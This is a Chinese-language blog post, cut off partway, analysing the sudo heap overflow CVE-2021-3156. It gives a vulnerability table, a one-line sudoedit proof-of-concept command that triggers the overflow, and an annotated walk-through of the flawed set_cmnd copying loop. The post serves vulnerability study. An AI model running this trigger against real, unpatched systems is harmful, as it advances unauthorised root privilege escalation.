

<!DOCTYPE html>
<html lang="zh-CN" data-default-color-scheme=auto>



<head>
  <meta charset="UTF-8">

  <link rel="apple-touch-icon" sizes="76x76" href="/img/24.png">
  <link rel="icon" href="/img/24.png">
  

  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, shrink-to-fit=no">
  <meta http-equiv="x-ua-compatible" content="ie=edge">
  
  <meta name="theme-color" content="#2f4154">
  <meta name="author" content="Jimi">
  <meta name="keywords" content="">
  
    <meta name="description" content="CVE-2021-3156漏洞描述1.9.5p2之前的Sudo包含一个off-by-one错误，该错误可能导致基于堆的缓冲区溢出，这允许通过sudoedit -s和以单个反斜杠字符结尾的命令行参数将权限提升到root。关于此漏洞的详细信息请参阅下表。关于此漏洞的更多信息，请参阅阿里云漏洞库和NVD：    描述项 具体值    CVE编号 CVE-2021-3156   NVD评分 7.8   披">
<meta property="og:type" content="article">
<meta property="og:title" content="CVE-2021-3156_二进制漏洞高阶利用：堆风水">
<meta property="og:url" content="https://jimi-lab.github.io/2025/08/19/CVE-2021-3156_%E4%BA%8C%E8%BF%9B%E5%88%B6%E6%BC%8F%E6%B4%9E%E9%AB%98%E9%98%B6%E5%88%A9%E7%94%A8%EF%BC%9A%E5%A0%86%E9%A3%8E%E6%B0%B4/index.html">
<meta property="og:site_name" content="Jimi&#39;s blog">
<meta property="og:description" content="CVE-2021-3156漏洞描述1.9.5p2之前的Sudo包含一个off-by-one错误，该错误可能导致基于堆的缓冲区溢出，这允许通过sudoedit -s和以单个反斜杠字符结尾的命令行参数将权限提升到root。关于此漏洞的详细信息请参阅下表。关于此漏洞的更多信息，请参阅阿里云漏洞库和NVD：    描述项 具体值    CVE编号 CVE-2021-3156   NVD评分 7.8   披">
<meta property="og:locale" content="zh_CN">
<meta property="og:image" content="https://jimi-lab.github.io/img/CVE-2021-3156_%E4%BA%8C%E8%BF%9B%E5%88%B6%E6%BC%8F%E6%B4%9E%E9%AB%98%E9%98%B6%E5%88%A9%E7%94%A8%EF%BC%9A%E5%A0%86%E9%A3%8E%E6%B0%B4.md/1.png">
<meta property="og:image" content="https://jimi-lab.github.io/img/CVE-2021-3156_%E4%BA%8C%E8%BF%9B%E5%88%B6%E6%BC%8F%E6%B4%9E%E9%AB%98%E9%98%B6%E5%88%A9%E7%94%A8%EF%BC%9A%E5%A0%86%E9%A3%8E%E6%B0%B4.md/2.png">
<meta property="og:image" content="https://jimi-lab.github.io/img/CVE-2021-3156_%E4%BA%8C%E8%BF%9B%E5%88%B6%E6%BC%8F%E6%B4%9E%E9%AB%98%E9%98%B6%E5%88%A9%E7%94%A8%EF%BC%9A%E5%A0%86%E9%A3%8E%E6%B0%B4.md/3.png">
<meta property="og:image" content="https://jimi-lab.github.io/img/CVE-2021-3156_%E4%BA%8C%E8%BF%9B%E5%88%B6%E6%BC%8F%E6%B4%9E%E9%AB%98%E9%98%B6%E5%88%A9%E7%94%A8%EF%BC%9A%E5%A0%86%E9%A3%8E%E6%B0%B4.md/4.png">
<meta property="og:image" content="https://jimi-lab.github.io/img/CVE-2021-3156_%E4%BA%8C%E8%BF%9B%E5%88%B6%E6%BC%8F%E6%B4%9E%E9%AB%98%E9%98%B6%E5%88%A9%E7%94%A8%EF%BC%9A%E5%A0%86%E9%A3%8E%E6%B0%B4.md/5.png">
<meta property="og:image" content="https://jimi-lab.github.io/img/CVE-2021-3156_%E4%BA%8C%E8%BF%9B%E5%88%B6%E6%BC%8F%E6%B4%9E%E9%AB%98%E9%98%B6%E5%88%A9%E7%94%A8%EF%BC%9A%E5%A0%86%E9%A3%8E%E6%B0%B4.md/6.png">
<meta property="og:image" content="https://jimi-lab.github.io/img/CVE-2021-3156_%E4%BA%8C%E8%BF%9B%E5%88%B6%E6%BC%8F%E6%B4%9E%E9%AB%98%E9%98%B6%E5%88%A9%E7%94%A8%EF%BC%9A%E5%A0%86%E9%A3%8E%E6%B0%B4.md/7.png">
<meta property="article:published_time" content="2025-08-18T16:00:00.000Z">
<meta property="article:modified_time" content="2025-08-26T10:23:33.037Z">
<meta property="article:author" content="Jimi">
<meta property="article:tag" content="堆溢出利用手法">
<meta property="article:tag" content="堆风水">
<meta property="article:tag" content="堆溢出漏洞利用链">
<meta name="twitter:card" content="summary_large_image">
<meta name="twitter:image" content="https://jimi-lab.github.io/img/CVE-2021-3156_%E4%BA%8C%E8%BF%9B%E5%88%B6%E6%BC%8F%E6%B4%9E%E9%AB%98%E9%98%B6%E5%88%A9%E7%94%A8%EF%BC%9A%E5%A0%86%E9%A3%8E%E6%B0%B4.md/1.png">
  
  
  
  <title>CVE-2021-3156_二进制漏洞高阶利用：堆风水 - Jimi&#39;s blog</title>

  <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />



  <link  rel="stylesheet" href="https://lib.baomitu.com/github-markdown-css/4.0.0/github-markdown.min.css" />

  <link  rel="stylesheet" href="https://lib.baomitu.com/hint.css/2.7.0/hint.min.css" />

  <link  rel="stylesheet" href="https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.css" />



<!-- 主题依赖的图标库，不要自行修改 -->
<!-- Do not modify the link that theme dependent icons -->

<link rel="stylesheet" href="//at.alicdn.com/t/c/font_1749284_5i9bdhy70f8.css">



<link rel="stylesheet" href="//at.alicdn.com/t/c/font_1736178_k526ubmyhba.css">


<link  rel="stylesheet" href="/css/main.css" />


  <link id="highlight-css" rel="stylesheet" href="/css/highlight.css" />
  
    <link id="highlight-css-dark" rel="stylesheet" href="/css/highlight-dark.css" />
  



  
<link rel="stylesheet" href="/css/background_video.css">



  <script id="fluid-configs">
    var Fluid = window.Fluid || {};
    Fluid.ctx = Object.assign({}, Fluid.ctx)
    var CONFIG = {"hostname":"jimi-lab.github.io","root":"/","version":"1.9.8","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false,"scope":[]},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"left","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"code_language":{"enable":true,"default":"TEXT"},"copy_btn":true,"image_caption":{"enable":true},"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"placement":"right","headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":false,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":false,"follow_dnt":true,"baidu":null,"google":{"measurement_id":null},"tencent":{"sid":null,"cid":null},"leancloud":{"app_id":null,"app_key":null,"server_url":null,"path":"window.location.pathname","ignore_local":false},"umami":{"src":null,"website_id":null,"domains":null,"start_time":"2024-01-01T00:00:00.000Z","token":null,"api_server":null}},"search_path":"/local-search.xml","include_content_in_search":true};

    if (CONFIG.web_analytics.follow_dnt) {
      var dntVal = navigator.doNotTrack || window.doNotTrack || navigator.msDoNotTrack;
      Fluid.ctx.dnt = dntVal && (dntVal.startsWith('1') || dntVal.startsWith('yes') || dntVal.startsWith('on'));
    }
  </script>
  <script  src="/js/utils.js" ></script>
  <script  src="/js/color-schema.js" ></script>
  


  
<meta name="generator" content="Hexo 7.3.0"></head>


<body>
  

  <header>
    

<div class="header-inner" style="height: 70vh;">
  <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
  <div class="container">
    <a class="navbar-brand" href="/">
      <strong>Jimi</strong>
    </a>

    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
            data-target="#navbarSupportedContent"
            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
      <div class="animated-icon"><span></span><span></span><span></span></div>
    </button>

    <!-- Collapsible content -->
    <div class="collapse navbar-collapse" id="navbarSupportedContent">
      <ul class="navbar-nav ml-auto text-center">
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/" target="_self">
                <i class="iconfont icon-home-fill"></i>
                <span>首页</span>
              </a>
            </li>
          
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/archives/" target="_self">
                <i class="iconfont icon-archive-fill"></i>
                <span>归档</span>
              </a>
            </li>
          
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/categories/" target="_self">
                <i class="iconfont icon-category-fill"></i>
                <span>分类</span>
              </a>
            </li>
          
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/tags/" target="_self">
                <i class="iconfont icon-tags-fill"></i>
                <span>标签</span>
              </a>
            </li>
          
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/about/" target="_self">
                <i class="iconfont icon-user-fill"></i>
                <span>关于</span>
              </a>
            </li>
          
        
        
          <li class="nav-item" id="search-btn">
            <a class="nav-link" target="_self" href="javascript:;" data-toggle="modal" data-target="#modalSearch" aria-label="Search">
              <i class="iconfont icon-search"></i>
            </a>
          </li>
          
        
        
          <li class="nav-item" id="color-toggle-btn">
            <a class="nav-link" target="_self" href="javascript:;" aria-label="Color Toggle">
              <i class="iconfont icon-dark" id="color-toggle-icon"></i>
            </a>
          </li>
        
      </ul>
    </div>
  </div>
</nav>

  

<div id="banner" class="banner" parallax=true
     style="background: url('/img/redCar.png') no-repeat center center; background-size: cover;">
  <div class="full-bg-img">
    <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
      <div class="banner-text text-center fade-in-up">
        <div class="h2">
          
            <span id="subtitle" data-typed-text="CVE-2021-3156_二进制漏洞高阶利用：堆风水"></span>
          
        </div>

        
          
  <div class="mt-3">
    
    
      <span class="post-meta">
        <i class="iconfont icon-date-fill" aria-hidden="true"></i>
        <time datetime="2025-08-19 00:00" pubdate>
          2025年8月19日 凌晨
        </time>
      </span>
    
  </div>

  <div class="mt-1">
    
      <span class="post-meta mr-2">
        <i class="iconfont icon-chart"></i>
        
          6.5k 字
        
      </span>
    

    
      <span class="post-meta mr-2">
        <i class="iconfont icon-clock-fill"></i>
        
        
        
          55 分钟
        
      </span>
    

    
    
  </div>


        
      </div>

      
    </div>
  </div>
</div>

</div>

  </header>

  <main>
    
      

<div class="container-fluid nopadding-x">
  <div class="row nomargin-x">
    <div class="side-col d-none d-lg-block col-lg-2">
      

    </div>

    <div class="col-lg-8 nopadding-x-md">
      <div class="container nopadding-x-md" id="board-ctn">
        <div id="board">
          <article class="post-content mx-auto">
            <h1 id="seo-header">CVE-2021-3156_二进制漏洞高阶利用：堆风水</h1>
            
            
              <div class="markdown-body">
                
                <h1 id="CVE-2021-3156"><a href="#CVE-2021-3156" class="headerlink" title="CVE-2021-3156"></a>CVE-2021-3156</h1><h3 id="漏洞描述"><a href="#漏洞描述" class="headerlink" title="漏洞描述"></a>漏洞描述</h3><p>1.9.5p2之前的Sudo包含一个off-by-one错误，该错误可能导致基于堆的缓冲区溢出，这允许通过sudoedit -s和以单个反斜杠字符结尾的命令行参数将权限提升到root。关于此漏洞的详细信息请参阅下表。关于此漏洞的更多信息，请参阅阿里云漏洞库和NVD：</p>
<table>
<thead>
<tr>
<th align="center"><strong><font style="color:rgb(79, 79, 79);">描述项</font></strong></th>
<th align="center"><strong><font style="color:rgb(79, 79, 79);">具体值</font></strong></th>
</tr>
</thead>
<tbody><tr>
<td align="center"><font style="color:rgb(79, 79, 79);">CVE编号</font></td>
<td align="center"><font style="color:rgb(79, 79, 79);">CVE-2021-3156</font></td>
</tr>
<tr>
<td align="center"><font style="color:rgb(79, 79, 79);">NVD评分</font></td>
<td align="center"><font style="color:rgb(79, 79, 79);">7.8</font></td>
</tr>
<tr>
<td align="center"><font style="color:rgb(79, 79, 79);">披露时间</font></td>
<td align="center"><font style="color:rgb(79, 79, 79);">2021-01-27</font></td>
</tr>
<tr>
<td align="center"><font style="color:rgb(79, 79, 79);">漏洞类型</font></td>
<td align="center"><font style="color:rgb(79, 79, 79);">堆缓冲区溢出、Off-by-one错误、跨界内存写</font></td>
</tr>
<tr>
<td align="center"><font style="color:rgb(79, 79, 79);">漏洞危害</font></td>
<td align="center"><font style="color:rgb(79, 79, 79);">本地提权</font></td>
</tr>
<tr>
<td align="center"><font style="color:rgb(79, 79, 79);">影响范围</font></td>
<td align="center"><font style="color:rgb(79, 79, 79);">1.8.2＜sudo＜1.8.31p2、1.9.0＜sudo＜1.9.5p1</font></td>
</tr>
</tbody></table>
<h4 id="POC-验证"><a href="#POC-验证" class="headerlink" title="POC 验证"></a>POC 验证</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs bash">sudoedit -s <span class="hljs-string">&#x27;\&#x27;</span> `python3 -c <span class="hljs-string">&quot;print(&#x27;A&#x27;*80)&quot;</span>`<br><br><span class="hljs-comment"># sudoedit：作用类似于 sudo vim，sudoedit 会使用用户的默认编辑器来打开指定文件</span><br><span class="hljs-comment"># -s：开启一个 shell</span><br><span class="hljs-comment"># &#x27;\&#x27;：转义字符</span><br><span class="hljs-comment"># python3 -c &quot;print(&#x27;A&#x27;*80)&quot;： 生成80个A</span><br></code></pre></td></tr></table></figure>

<p><img src="/../img/CVE-2021-3156_%E4%BA%8C%E8%BF%9B%E5%88%B6%E6%BC%8F%E6%B4%9E%E9%AB%98%E9%98%B6%E5%88%A9%E7%94%A8%EF%BC%9A%E5%A0%86%E9%A3%8E%E6%B0%B4.md/1.png"></p>
<h2 id="堆溢出点"><a href="#堆溢出点" class="headerlink" title="堆溢出点"></a>堆溢出点</h2><p>溢出函数（sudo-1.8.21&#x2F;pluguns&#x2F;sudoers.c&#x2F;set_cmnd）</p>
<p>以下代码错误地处理了以 \ 结尾的参数，导致循环复制时越过了字符串边界(\0)，从而将后续内存中的大量数据（命令行中生成的80个’A’）写入了 user_args 的缓冲区，引发了溢出。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-keyword">if</span> (NewArgc &gt; <span class="hljs-number">1</span>) &#123;<br>	    <span class="hljs-type">char</span> *to, *from, **av;<br>	    <span class="hljs-type">size_t</span> size, n;<br><br><br>	    <span class="hljs-keyword">for</span> (size = <span class="hljs-number">0</span>, av = NewArgv + <span class="hljs-number">1</span>; *av; av++)		# 遍历命令行参数   NewArgv[<span class="hljs-number">0</span>]: <span class="hljs-string">&quot;sudoedit&quot;</span>、NewArgv[<span class="hljs-number">1</span>]: <span class="hljs-string">&quot;-s&quot;</span>、NewArgv[<span class="hljs-number">2</span>]: \、NewArgv[<span class="hljs-number">3</span>]: <span class="hljs-string">&quot;AAAAAAAAAAAAAAAAA...&quot;</span>、NewArgv[<span class="hljs-number">4</span>]: <span class="hljs-literal">NULL</span> (数组结束)<br>    		size += <span class="hljs-built_in">strlen</span>(*av) + <span class="hljs-number">1</span>;					# 计算每个参数字符串的长度 (<span class="hljs-built_in">strlen</span>)，并+<span class="hljs-number">1</span>，这个<span class="hljs-number">1</span>就是参数之间的空格或者命令行最后的\<span class="hljs-number">0</span>结束符<br>	    <span class="hljs-keyword">if</span> (size == <span class="hljs-number">0</span> || (user_args = <span class="hljs-built_in">malloc</span>(size)) == <span class="hljs-literal">NULL</span>) &#123;			#为user_args在堆上分配空间<br>		sudo_warnx(U_(<span class="hljs-string">&quot;%s: %s&quot;</span>), __func__, U_(<span class="hljs-string">&quot;unable to allocate memory&quot;</span>));<br>		debug_return_int(<span class="hljs-number">-1</span>);<br>	    &#125;<br>	    <span class="hljs-keyword">if</span> (ISSET(sudo_mode, MODE_SHELL|MODE_LOGIN_SHELL)) &#123;<br>        #若sudo为shell，进入以下代码<br>		<span class="hljs-keyword">for</span> (to = user_args, av = NewArgv + <span class="hljs-number">1</span>; (from = *av); av++) &#123;<br>		    <span class="hljs-keyword">while</span> (*from) &#123;<br>			<span class="hljs-keyword">if</span> (from[<span class="hljs-number">0</span>] == <span class="hljs-string">&#x27;\\&#x27;</span> &amp;&amp; !<span class="hljs-built_in">isspace</span>((<span class="hljs-type">unsigned</span> <span class="hljs-type">char</span>)from[<span class="hljs-number">1</span>]))		#如果当前字符from[<span class="hljs-number">0</span>]是一个<span class="hljs-string">&#x27;\&#x27;，并且下一个字符不为空</span><br><span class="hljs-string">			    from++;														# 跳过\0结束符</span><br><span class="hljs-string">			*to++ = *from++;												# 将A复制到user_args缓冲区</span><br><span class="hljs-string">		    &#125;</span><br><span class="hljs-string">		    *to++ = &#x27;</span> <span class="hljs-string">&#x27;;</span><br><span class="hljs-string">		&#125;</span><br><span class="hljs-string">		*--to = &#x27;</span>\<span class="hljs-number">0</span><span class="hljs-string">&#x27;;</span><br><span class="hljs-string">	    &#125; else &#123;							# 若sudo不是shell模式则走else</span><br><span class="hljs-string">		for (to = user_args, av = NewArgv + 1; *av; av++) &#123;</span><br><span class="hljs-string">		    n = strlcpy(to, *av, size - (to - user_args));</span><br><span class="hljs-string">		    if (n &gt;= size - (to - user_args)) &#123;</span><br><span class="hljs-string">			sudo_warnx(U_(&quot;internal error, %s overflow&quot;), __func__);</span><br><span class="hljs-string">			debug_return_int(-1);</span><br><span class="hljs-string">		    &#125;</span><br><span class="hljs-string">		    to += n;</span><br><span class="hljs-string">		    *to++ = &#x27;</span> <span class="hljs-string">&#x27;;</span><br><span class="hljs-string">		&#125;</span><br><span class="hljs-string">		*--to = &#x27;</span>\<span class="hljs-number">0</span><span class="hljs-string">&#x27;;</span><br><span class="hljs-string">	    &#125;</span><br><span class="hljs-string">	&#125;</span><br><span class="hljs-string">    &#125;</span><br></code></pre></td></tr></table></figure>



<p>漏洞函数讲解：</p>
<p><font style="color:rgb(0, 0, 0);">外层 for 循环 - 第一次迭代 (处理参数 </font><code>&lt;font style=&quot;color:rgb(0, 0, 0);&quot;&gt;&quot;-s&quot;&lt;/font&gt;</code><font style="color:rgb(0, 0, 0);">)</font></p>
<ol>
<li><code>&lt;font style=&quot;color:rgb(0, 0, 0);&quot;&gt;from = *av;&lt;/font&gt;</code><font style="color:rgb(0, 0, 0);"> </font><font style="color:rgb(0, 0, 0);">-&gt;</font><font style="color:rgb(0, 0, 0);"> </font><code>&lt;font style=&quot;color:rgb(0, 0, 0);&quot;&gt;from&lt;/font&gt;</code><font style="color:rgb(0, 0, 0);"> </font><font style="color:rgb(0, 0, 0);">指向</font><font style="color:rgb(0, 0, 0);"> </font><code>&lt;font style=&quot;color:rgb(0, 0, 0);&quot;&gt;&quot;-s&quot;&lt;/font&gt;</code><font style="color:rgb(0, 0, 0);">。</font></li>
<li><font style="color:rgb(0, 0, 0);">内层</font><font style="color:rgb(0, 0, 0);"> </font><code>&lt;font style=&quot;color:rgb(0, 0, 0);&quot;&gt;while (*from)&lt;/font&gt;</code><font style="color:rgb(0, 0, 0);"> </font><font style="color:rgb(0, 0, 0);">循环开始：</font><ul>
<li><font style="color:rgb(0, 0, 0);">它会一个一个地复制</font><font style="color:rgb(0, 0, 0);"> </font><code>&lt;font style=&quot;color:rgb(0, 0, 0);&quot;&gt;&#39;-&#39;&lt;/font&gt;</code><font style="color:rgb(0, 0, 0);"> </font><font style="color:rgb(0, 0, 0);">和</font><font style="color:rgb(0, 0, 0);"> </font><code>&lt;font style=&quot;color:rgb(0, 0, 0);&quot;&gt;&#39;s&#39;&lt;/font&gt;</code><font style="color:rgb(0, 0, 0);"> </font><font style="color:rgb(0, 0, 0);">到</font><font style="color:rgb(0, 0, 0);"> </font><code>&lt;font style=&quot;color:rgb(0, 0, 0);&quot;&gt;user_args&lt;/font&gt;</code><font style="color:rgb(0, 0, 0);"> </font><font style="color:rgb(0, 0, 0);">缓冲区。</font></li>
<li><font style="color:rgb(0, 0, 0);">这个过程是正常的，没有触发任何特殊逻辑。</font></li>
<li><font style="color:rgb(0, 0, 0);">循环结束后，代码会向</font><font style="color:rgb(0, 0, 0);"> </font><code>&lt;font style=&quot;color:rgb(0, 0, 0);&quot;&gt;user_args&lt;/font&gt;</code><font style="color:rgb(0, 0, 0);"> </font><font style="color:rgb(0, 0, 0);">追加一个空格。</font></li>
</ul>
</li>
<li><font style="color:rgb(0, 0, 0);">外层</font><font style="color:rgb(0, 0, 0);"> </font><code>&lt;font style=&quot;color:rgb(0, 0, 0);&quot;&gt;for&lt;/font&gt;</code><font style="color:rgb(0, 0, 0);"> </font><font style="color:rgb(0, 0, 0);">循环结束本次迭代，</font><code>&lt;font style=&quot;color:rgb(0, 0, 0);&quot;&gt;av++&lt;/font&gt;</code><font style="color:rgb(0, 0, 0);">，现在</font><font style="color:rgb(0, 0, 0);"> </font><code>&lt;font style=&quot;color:rgb(0, 0, 0);&quot;&gt;av&lt;/font&gt;</code><font style="color:rgb(0, 0, 0);"> </font><font style="color:rgb(0, 0, 0);">指向</font><font style="color:rgb(0, 0, 0);"> </font><code>&lt;font style=&quot;color:rgb(0, 0, 0);&quot;&gt;NewArgv[2]&lt;/font&gt;</code><font style="color:rgb(0, 0, 0);">，也就是</font><font style="color:rgb(0, 0, 0);"> </font><code>&lt;font style=&quot;color:rgb(0, 0, 0);&quot;&gt;\&lt;/font&gt;</code><font style="color:rgb(0, 0, 0);">。</font></li>
</ol>
<p><code>&lt;font style=&quot;color:rgb(0, 0, 0);&quot;&gt;user_args&lt;/font&gt;</code><font style="color:rgb(0, 0, 0);"> 缓冲区现在的内容: </font><code>&lt;font style=&quot;color:rgb(0, 0, 0);&quot;&gt;&quot;-s &quot;&lt;/font&gt;</code></p>
<p><font style="color:rgb(0, 0, 0);">外层 for 循环 - 第二次迭代 (处理参数 </font><code>&lt;font style=&quot;color:rgb(0, 0, 0);&quot;&gt;\&lt;/font&gt;</code><font style="color:rgb(0, 0, 0);"> - 漏洞触发点!)</font></p>
<ol>
<li><code>&lt;font style=&quot;color:rgb(0, 0, 0);&quot;&gt;from = *av;&lt;/font&gt;</code><font style="color:rgb(0, 0, 0);"> -&gt; </font><code>&lt;font style=&quot;color:rgb(0, 0, 0);&quot;&gt;from&lt;/font&gt;</code><font style="color:rgb(0, 0, 0);"> 现在指向 </font><code>&lt;font style=&quot;color:rgb(0, 0, 0);&quot;&gt;\&lt;/font&gt;</code><font style="color:rgb(0, 0, 0);">。</font></li>
<li><font style="color:rgb(0, 0, 0);">内层 </font><code>&lt;font style=&quot;color:rgb(0, 0, 0);&quot;&gt;while (*from)&lt;/font&gt;</code><font style="color:rgb(0, 0, 0);"> 循环开始。当前 </font><code>&lt;font style=&quot;color:rgb(0, 0, 0);&quot;&gt;*from&lt;/font&gt;</code><font style="color:rgb(0, 0, 0);"> 的值是 </font><code>&lt;font style=&quot;color:rgb(0, 0, 0);&quot;&gt;&#39;\\&#39;&lt;/font&gt;</code><font style="color:rgb(0, 0, 0);">，不是 </font><code>&lt;font style=&quot;color:rgb(0, 0, 0);&quot;&gt;\0&lt;/font&gt;</code><font style="color:rgb(0, 0, 0);">，所以循环体执行。</font></li>
<li><strong><font style="color:rgb(0, 0, 0);">进入 </font></strong><code>**&lt;font style=&quot;color:rgb(0, 0, 0);&quot;&gt;if&lt;/font&gt;**</code><strong><font style="color:rgb(0, 0, 0);"> 判断: </font></strong><code>**&lt;font style=&quot;color:rgb(0, 0, 0);&quot;&gt;if (from[0] == &#39;\\&#39; &amp;&amp; !isspace((unsigned char)from[1]))&lt;/font&gt;**</code><ul>
<li><code>&lt;font style=&quot;color:rgb(0, 0, 0);&quot;&gt;from[0] == &#39;\\&#39;&lt;/font&gt;</code><font style="color:rgb(0, 0, 0);"> </font><font style="color:rgb(0, 0, 0);">-&gt;</font><font style="color:rgb(0, 0, 0);"> </font><strong><font style="color:rgb(0, 0, 0);">True</font></strong><font style="color:rgb(0, 0, 0);">。当前字符确实是反斜杠。</font></li>
<li><code>&lt;font style=&quot;color:rgb(0, 0, 0);&quot;&gt;!isspace((unsigned char)from[1])&lt;/font&gt;</code><font style="color:rgb(0, 0, 0);"> </font><font style="color:rgb(0, 0, 0);">-&gt;</font><font style="color:rgb(0, 0, 0);"> </font><strong><font style="color:rgb(0, 0, 0);">这是最关键的一步！</font></strong><ul>
<li><code>&lt;font style=&quot;color:rgb(0, 0, 0);&quot;&gt;from[1]&lt;/font&gt;</code><font style="color:rgb(0, 0, 0);"> </font><font style="color:rgb(0, 0, 0);">是什么？它是在内存中紧跟在</font><font style="color:rgb(0, 0, 0);"> </font><code>&lt;font style=&quot;color:rgb(0, 0, 0);&quot;&gt;\&lt;/font&gt;</code><font style="color:rgb(0, 0, 0);"> </font><font style="color:rgb(0, 0, 0);">后面的那个字符。根据我们上面的内存布局图，它就是字符串</font><font style="color:rgb(0, 0, 0);"> </font><code>&lt;font style=&quot;color:rgb(0, 0, 0);&quot;&gt;\&lt;/font&gt;</code><font style="color:rgb(0, 0, 0);"> </font><font style="color:rgb(0, 0, 0);">的结束符</font><font style="color:rgb(0, 0, 0);"> </font><code>&lt;font style=&quot;color:rgb(0, 0, 0);&quot;&gt;\0&lt;/font&gt;</code><font style="color:rgb(0, 0, 0);">。</font></li>
<li><code>&lt;font style=&quot;color:rgb(0, 0, 0);&quot;&gt;isspace(&#39;\0&#39;)&lt;/font&gt;</code><font style="color:rgb(0, 0, 0);"> </font><font style="color:rgb(0, 0, 0);">这个函数会返回</font><font style="color:rgb(0, 0, 0);"> </font><code>&lt;font style=&quot;color:rgb(0, 0, 0);&quot;&gt;false&lt;/font&gt;</code><font style="color:rgb(0, 0, 0);">（因为空字符不被视为空格、制表符等）。</font></li>
<li><font style="color:rgb(0, 0, 0);">所以</font><font style="color:rgb(0, 0, 0);"> </font><code>&lt;font style=&quot;color:rgb(0, 0, 0);&quot;&gt;!isspace(...)&lt;/font&gt;</code><font style="color:rgb(0, 0, 0);"> </font><font style="color:rgb(0, 0, 0);">的结果是</font><font style="color:rgb(0, 0, 0);"> </font><code>&lt;font style=&quot;color:rgb(0, 0, 0);&quot;&gt;!false&lt;/font&gt;</code><font style="color:rgb(0, 0, 0);"> </font><font style="color:rgb(0, 0, 0);">-&gt;</font><font style="color:rgb(0, 0, 0);"> </font><strong><font style="color:rgb(0, 0, 0);">True</font></strong><font style="color:rgb(0, 0, 0);">。</font></li>
</ul>
</li>
<li><font style="color:rgb(0, 0, 0);">整个</font><font style="color:rgb(0, 0, 0);"> </font><code>&lt;font style=&quot;color:rgb(0, 0, 0);&quot;&gt;if&lt;/font&gt;</code><font style="color:rgb(0, 0, 0);"> </font><font style="color:rgb(0, 0, 0);">条件</font><font style="color:rgb(0, 0, 0);"> </font><code>&lt;font style=&quot;color:rgb(0, 0, 0);&quot;&gt;(True &amp;&amp; True)&lt;/font&gt;</code><font style="color:rgb(0, 0, 0);"> </font><font style="color:rgb(0, 0, 0);">结果为</font><font style="color:rgb(0, 0, 0);"> </font><strong><font style="color:rgb(0, 0, 0);">True</font></strong><font style="color:rgb(0, 0, 0);">。</font></li>
</ul>
</li>
<li><code>**&lt;font style=&quot;color:rgb(0, 0, 0);&quot;&gt;if&lt;/font&gt;**</code><strong><font style="color:rgb(0, 0, 0);"> 语句体被执行: </font></strong><code>**&lt;font style=&quot;color:rgb(0, 0, 0);&quot;&gt;from++;&lt;/font&gt;**</code><ul>
<li><code>&lt;font style=&quot;color:rgb(0, 0, 0);&quot;&gt;from&lt;/font&gt;</code><font style="color:rgb(0, 0, 0);"> 指针向后移动了一位。它</font><strong><font style="color:rgb(0, 0, 0);">越过</font></strong><font style="color:rgb(0, 0, 0);">了 </font><code>&lt;font style=&quot;color:rgb(0, 0, 0);&quot;&gt;\&lt;/font&gt;</code><font style="color:rgb(0, 0, 0);"> 字符串的结束符 </font><code>&lt;font style=&quot;color:rgb(0, 0, 0);&quot;&gt;\0&lt;/font&gt;</code><font style="color:rgb(0, 0, 0);">，现在指向了下一个字符串（那80个’A’）的第一个 </font><code>&lt;font style=&quot;color:rgb(0, 0, 0);&quot;&gt;&#39;A&#39;&lt;/font&gt;</code><font style="color:rgb(0, 0, 0);">！</font></li>
</ul>
</li>
<li><strong><font style="color:rgb(0, 0, 0);">执行 </font></strong><code>**&lt;font style=&quot;color:rgb(0, 0, 0);&quot;&gt;*to++ = *from++;&lt;/font&gt;**</code><ul>
